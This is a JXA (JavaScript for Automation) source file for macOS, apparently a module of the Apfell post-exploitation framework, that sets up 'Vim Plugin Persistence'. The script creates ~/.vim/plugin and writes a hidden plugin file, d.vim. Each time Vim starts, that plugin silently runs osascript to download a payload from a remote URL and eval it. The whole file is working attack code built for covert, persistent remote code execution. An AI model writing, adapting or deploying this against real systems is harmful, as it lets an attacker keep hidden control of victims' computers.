//Vim Plugin Persistence
//https://gist.github.com/manasthakur/ab4cf8d32a28ea38271ac0d07373bb53
//Concept from Xorrior

//example usage
//VimPluginPersistence('http://path/to/hosted/apfellpayload')


function VimPluginPersistence (pathToExternalApfell) {
	ObjC.import('Foundation')
	ObjC.import('stdlib')
	var app = Application.currentApplication();
	app.includeStandardAdditions = true;

	var userHome = $.getenv('HOME')

	var output = ""
	try{
		function listDirectory(strPath) {
			var fm = $.NSFileManager.defaultManager;
        	return ObjC.unwrap(
                fm.contentsOfDirectoryAtPathError($(strPath)
                    .stringByExpandingTildeInPath, null))
            .map(ObjC.unwrap);
    	}
        
		function writeTextToFile(text, file, overwriteExistingContent) {
        	var fileString = file.toString()
        	var openedFile = app.openForAccess(Path(fileString), { writePermission: true })
        	if (overwriteExistingContent) {
            	app.setEof(openedFile, { to: 0 })
        	}
        	app.write(text, { to: openedFile, startingAt: app.getEof(openedFile) })
        	app.closeAccess(openedFile)
		}
		
var pluginTemplate = `
silent execute '!' . 'osascript -l JavaScript -e "eval(ObjC.unwrap($.NSString.alloc.initWithDataEncoding($.NSData.dataWithContentsOfURL($.NSURL.URLWithString(\\"hostedApfell\\")),$.NSUTF8StringEncoding)));"&'`

	var pluginPath = userHome + '/.vim/plugin/d.vim'
	isDir=Ref()
	var hiddenvimDirectoryExistsCheck = $.NSFileManager.alloc.init.fileExistsAtPathIsDirectory(userHome + '/.vim',isDir)
	if (hiddenvimDirectoryExistsCheck == false) {
	$.NSFileManager.defaultManager.createDirectoryAtPathWithIntermediateDirectoriesAttributesError(userHome + '/.vim', false, $(), $())
		}
	var pluginDirectoryExistsCheck = $.NSFileManager.alloc.init.fileExistsAtPathIsDirectory(userHome + '/.vim/plugin',isDir)	
	if (pluginDirectoryExistsCheck == false) {
	$.NSFileManager.defaultManager.createDirectoryAtPathWithIntermediateDirectoriesAttributesError(userHome + '/.vim/plugin', false, $(), $())
		}
	var updatedPlugin = pluginTemplate.replace(/hostedApfell/g,pathToExternalApfell)
	writeTextToFile(updatedPlugin, pluginPath, true)
					
	output += "Vim Plugin Persistence enabled at  " + pluginPath
						 	
				
}catch(error){
       output += error.toString()
		}
	return output
}
